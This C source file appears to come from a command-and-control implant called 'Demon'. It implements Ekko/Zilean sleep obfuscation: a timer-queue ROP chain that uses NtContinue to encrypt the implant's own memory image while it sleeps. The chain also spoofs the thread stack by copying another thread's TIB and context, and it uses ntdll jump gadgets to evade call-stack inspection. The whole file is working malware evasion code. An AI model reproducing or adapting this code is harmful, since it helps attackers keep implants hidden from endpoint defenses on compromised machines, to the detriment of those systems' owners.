#ifdef SLEEPOBF_USE_TIMER

#include <Demon.h>

#include <common/Macros.h>
#include <core/SleepObf.h>
#include <core/Win32.h>
#include <core/MiniStd.h>
#include <core/Thread.h>

#include <ntstatus.h>

#if _WIN64

/*!
 * @brief
 *  ekko/zilean sleep obfuscation technique using
 *  Timers Api (RtlCreateTimer/RtlRegisterWait)
 *  with stack duplication/spoofing by duplicating the
 *  NT_TIB from another thread.
 *
 * @note
 *  this technique most likely wont work when the
 *  process is also actively using the timers api.
 *  So in future either use Veh + hardware breakpoints
 *  to create our own thread pool or leave it as it is.
 *
 * @param TimeOut
 * @param Method
 * @return
 */
BOOL TimerObf(
    _In_ ULONG TimeOut,
    _In_ ULONG Method
) {
    /* Handles */
    HANDLE   Queue     = { 0 };
    HANDLE   Timer     = { 0 };
    HANDLE   ThdSrc    = { 0 };
    HANDLE   EvntStart = { 0 };
    HANDLE   EvntTimer = { 0 };
    HANDLE   EvntDelay = { 0 };
    UCHAR    Buf[ 16 ] = { 0 };
    USTRING  Key       = { 0 };
    USTRING  Img       = { 0 };
    PVOID    ImgBase   = { 0 };
    ULONG    ImgSize   = { 0 };
    CONTEXT  TimerCtx  = { 0 };
    CONTEXT  ThdCtx    = { 0 };
    CONTEXT  Rop[ 13 ] = { 0 };
    ULONG    Value     = { 0 };
    ULONG    Delay     = { 0 };
    BOOL     Success   = { 0 };
    NT_TIB   NtTib     = { 0 };
    NT_TIB   BkpTib    = { 0 };
    NTSTATUS NtStatus  = { 0 };
    ULONG    Inc       = { 0 };
    LPVOID   ImageBase = { 0 };
    SIZE_T   ImageSize = { 0 };
    LPVOID   TxtBase   = { 0 };
    SIZE_T   TxtSize   = { 0 };
    ULONG    Protect   = { 0 };
    BYTE     JmpBypass = { 0 };
    PVOID    JmpGadget = { 0 };
    BYTE     JmpPad[]  = { 0xFF, 0xE0 };

    ImageBase = TxtBase = Instance->Session.ModuleBase;
    ImageSize = TxtSize = Instance->Session.ModuleSize;
    Protect   = PAGE_EXECUTE_READWRITE;
    JmpBypass = Instance->Config.Implant.SleepJmpBypass;

    if ( Instance->Session.TxtBase && Instance->Session.TxtSize ) {
        TxtBase = Instance->Session.TxtBase;
        TxtSize = Instance->Session.TxtSize;
        Protect = PAGE_EXECUTE_READ;
    }

    /* create a random key */
    for ( BYTE i = 0; i < 16; i++ ) {
        Buf[ i ] = RandomNumber32( );
    }

    /* set specific context flags */
    ThdCtx.ContextFlags = TimerCtx.ContextFlags = CONTEXT_FULL;

    /* set key pointer and size */
    Key.Buffer = Buf;
    Key.Length = Key.MaximumLength = sizeof( Buf );

    /* set agent memory pointer and size */
    Img.Buffer = ImgBase           = Instance->Session.ModuleBase;
    Img.Length = Img.MaximumLength = ImgSize = Instance->Session.ModuleSize;

    /* Both Ekko and Zilean now use a timer queue for the ROP chain.
     * Zilean originally used RtlRegisterWait but that does NOT guarantee
     * all callbacks run on the same wait thread, making NtContinue unsafe. */
    NtStatus = Instance->Win32.RtlCreateTimerQueue( &Queue );

    if ( NT_SUCCESS( NtStatus ) )
    {
        /* create events */
        if ( NT_SUCCESS( NtStatus = Instance->Win32.NtCreateEvent( &EvntTimer, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) &&
             NT_SUCCESS( NtStatus = Instance->Win32.NtCreateEvent( &EvntStart, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) &&
             NT_SUCCESS( NtStatus = Instance->Win32.NtCreateEvent( &EvntDelay, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) )
        {
            /* get the context of the timer thread */
            NtStatus = Instance->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Instance->Win32.RtlCaptureContext ), &TimerCtx, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD );

            if ( NT_SUCCESS( NtStatus ) )
            {
                /* Send event that we got the context of the timer thread */
                NtStatus = Instance->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( EventSet ), EvntTimer, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD );

                if ( NT_SUCCESS( NtStatus ) )
                {
                    /* wait til we successfully retrieved the timers thread context */
                    if ( ! NT_SUCCESS( NtStatus = SysNtWaitForSingleObject( EvntTimer, FALSE, NULL ) ) ) {
                        PRINTF( "Failed waiting for starting event: %lx\n", NtStatus )
                        goto LEAVE;
                    }

                    /* if stack spoofing is enabled then prepare some stuff */
                    if ( Instance->Config.Implant.StackSpoof )
                    {
                        /* retrieve Tib if stack spoofing is enabled */
                        if ( ! ThreadQueryTib( C_PTR( TimerCtx.Rsp ), &NtTib ) ) {
                            PUTS( "Failed to retrieve Tib" )
                            goto LEAVE;
                        }

                        /* duplicate the current thread we are going to spoof the stack */
                        if ( ! NT_SUCCESS( NtStatus = SysNtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &ThdSrc, 0, 0, DUPLICATE_SAME_ACCESS ) ) ) {
                            PRINTF( "NtDuplicateObject Failed: %lx\n", NtStatus )
                            goto LEAVE;
                        }

                        /* NtTib backup */
                        MemCopy( &BkpTib, &Instance->Teb->NtTib, sizeof( NT_TIB ) );
                    }

                    /* search for jmp instruction */
                    if ( JmpBypass )
                    {
                        /* change padding to "jmp rbx" */
                        if ( JmpBypass == SLEEPOBF_BYPASS_JMPRBX ) {
                            JmpPad[ 1 ] = 0x23;
                        }

                        /* scan memory for gadget */
                        if ( ! ( JmpGadget = MmGadgetFind(
                            C_PTR( U_PTR( Instance->Modules.Ntdll ) + LDR_GADGET_HEADER_SIZE ),
                            LDR_GADGET_MODULE_SIZE,
                            JmpPad,
                            sizeof( JmpPad )
                        ) ) ) {
                            JmpBypass = SLEEPOBF_BYPASS_NONE;
                        }
                    }

                    /* at this point we can start preparing the ROPs and execute the timers */
                    for ( int i = 0; i < 13; i++ ) {
                        MemCopy( &Rop[ i ], &TimerCtx, sizeof( CONTEXT ) );
                        Rop[ i ].Rip  = U_PTR( JmpGadget );
                        Rop[ i ].Rsp -= sizeof( PVOID );
                    }

                    /* Start of Ropchain */
                    OBF_JMP( Inc, Instance->Win32.WaitForSingleObjectEx );
                    Rop[ Inc ].Rcx = U_PTR( EvntStart );
                    Rop[ Inc ].Rdx = U_PTR( INFINITE );
                    Rop[ Inc ].R8  = U_PTR( FALSE );
                    Inc++;

                    /* Protect */
                    OBF_JMP( Inc, Instance->Win32.VirtualProtect );
                    Rop[ Inc ].Rcx = U_PTR( ImgBase );
                    Rop[ Inc ].Rdx = U_PTR( ImgSize );
                    Rop[ Inc ].R8  = U_PTR( PAGE_READWRITE );
                    Rop[ Inc ].R9  = U_PTR( &Value );
                    Inc++;

                    /* Encrypt image base address */
                    OBF_JMP( Inc, Instance->Win32.SystemFunction032 );
                    Rop[ Inc ].Rcx = U_PTR( &Img );
                    Rop[ Inc ].Rdx = U_PTR( &Key );
                    Inc++;

                    /* perform stack spoofing */
                    if ( Instance->Config.Implant.StackSpoof ) {
                        OBF_JMP( Inc, Instance->Win32.NtGetContextThread )
                        Rop[ Inc ].Rcx = U_PTR( ThdSrc  );
                        Rop[ Inc ].Rdx = U_PTR( &ThdCtx );
                        Inc++;

                        OBF_JMP( Inc, Instance->Win32.RtlCopyMappedMemory )
                        Rop[ Inc ].Rcx = U_PTR( &TimerCtx.Rip );
                        Rop[ Inc ].Rdx = U_PTR( &ThdCtx.Rip );
                        Rop[ Inc ].R8  = U_PTR( sizeof( VOID ) );
                        Inc++;

                        OBF_JMP( Inc, Instance->Win32.RtlCopyMappedMemory )
                        Rop[ Inc ].Rcx = U_PTR( &Instance->Teb->NtTib );
                        Rop[ Inc ].Rdx = U_PTR( &NtTib );
                        Rop[ Inc ].R8  = U_PTR( sizeof( NT_TIB ) );
                        Inc++;

                        OBF_JMP( Inc, Instance->Win32.NtSetContextThread )
                        Rop[ Inc ].Rcx = U_PTR( ThdSrc    );
                        Rop[ Inc ].Rdx = U_PTR( &TimerCtx );
                        Inc++;
                    }

                    /* Sleep */
                    OBF_JMP( Inc, Instance->Win32.WaitForSingleObjectEx )
                    Rop[ Inc ].Rcx = U_PTR( NtCurrentProcess() );
                    Rop[ Inc ].Rdx = U_PTR( Delay + TimeOut );
                    Rop[ Inc ].R8  = U_PTR( FALSE );
                    Inc++;

                    /* undo stack spoofing */
                    if ( Instance->Config.Implant.StackSpoof ) {
                        OBF_JMP( Inc, Instance->Win32.RtlCopyMappedMemory )
                        Rop[ Inc ].Rcx = U_PTR( &Instance->Teb->NtTib );
                        Rop[ Inc ].Rdx = U_PTR( &BkpTib );
                        Rop[ Inc ].R8  = U_PTR( sizeof( NT_TIB ) );
                        Inc++;

                        OBF_JMP( Inc, Instance->Win32.NtSetContextThread )
                        Rop[ Inc ].Rcx = U_PTR( ThdSrc  );
                        Rop[ Inc ].Rdx = U_PTR( &ThdCtx );
                        Inc++;
                    }

                    /* Sys032 */
                    OBF_JMP( Inc, Instance->Win32.SystemFunction032 )
                    Rop[ Inc ].Rcx = U_PTR( &Img );
                    Rop[ Inc ].Rdx = U_PTR( &Key );
                    Inc++;

                    /* Protect */
                    OBF_JMP( Inc, Instance->Win32.VirtualProtect )
                    Rop[ Inc ].Rcx = U_PTR( TxtBase );
                    Rop[ Inc ].Rdx = U_PTR( TxtSize );
                    Rop[ Inc ].R8  = U_PTR( Protect );
                    Rop[ Inc ].R9  = U_PTR( &Value );
                    Inc++;

                    /* End of Ropchain */
                    OBF_JMP( Inc, Instance->Win32.NtSetEvent )
                    Rop[ Inc ].Rcx = U_PTR( EvntDelay );
                    Rop[ Inc ].Rdx = U_PTR( NULL );
                    Inc++;

                    PRINTF( "Rops to be executed: %d\n", Inc )

                    /* execute/queue the timers — both Ekko and Zilean now use
                     * a timer queue with WT_EXECUTEINTIMERTHREAD to guarantee
                     * all NtContinue callbacks run on the same thread. */
                    for ( int i = 0; i < Inc; i++ ) {
                        if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Instance->Win32.NtContinue ), &Rop[ i ], Delay += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
                            PRINTF( "RtlCreateTimer Failed: %lx\n", NtStatus )
                            goto LEAVE;
                        }
                    }

                    /* just wait for the sleep to end */
                    if ( ! ( Success = NT_SUCCESS( NtStatus = SysNtSignalAndWaitForSingleObject( EvntStart, EvntDelay, FALSE, NULL ) ) ) ) {
                        PRINTF( "NtSignalAndWaitForSingleObject Failed: %lx\n", NtStatus );
                    }
                } else {
                    PRINTF( "RtlCreateTimer Failed: %lx\n", NtStatus )
                }
            } else {
                PRINTF( "RtlCreateTimer Failed: %lx\n", NtStatus )
            }
        } else {
            PRINTF( "NtCreateEvent Failed: %lx\n", NtStatus )
        }
    } else {
        PRINTF( "RtlCreateTimerQueue Failed: %lx\n", NtStatus )
    }

LEAVE: /* cleanup */
    if ( Queue ) {
        Instance->Win32.RtlDeleteTimerQueueEx( Queue, INVALID_HANDLE_VALUE );
        Queue = NULL;
    }

    if ( EvntTimer ) {
        SysNtClose( EvntTimer );
        EvntTimer = NULL;
    }

    if ( EvntStart ) {
        SysNtClose( EvntStart );
        EvntStart = NULL;
    }

    if ( EvntDelay ) {
        SysNtClose( EvntDelay );
        EvntDelay = NULL;
    }

    if ( ThdSrc ) {
        SysNtClose( ThdSrc );
        ThdSrc = NULL;
    }

    /* clear the structs from stack */
    for ( int i = 0; i < 13; i++ ) {
        RtlSecureZeroMemory( &Rop[ i ], sizeof( CONTEXT ) );
    }

    /* clear key from memory */
    RtlSecureZeroMemory( Buf, sizeof( Buf ) );

    return Success;
}

#endif /* _WIN64 */

#endif /* SLEEPOBF_USE_TIMER */
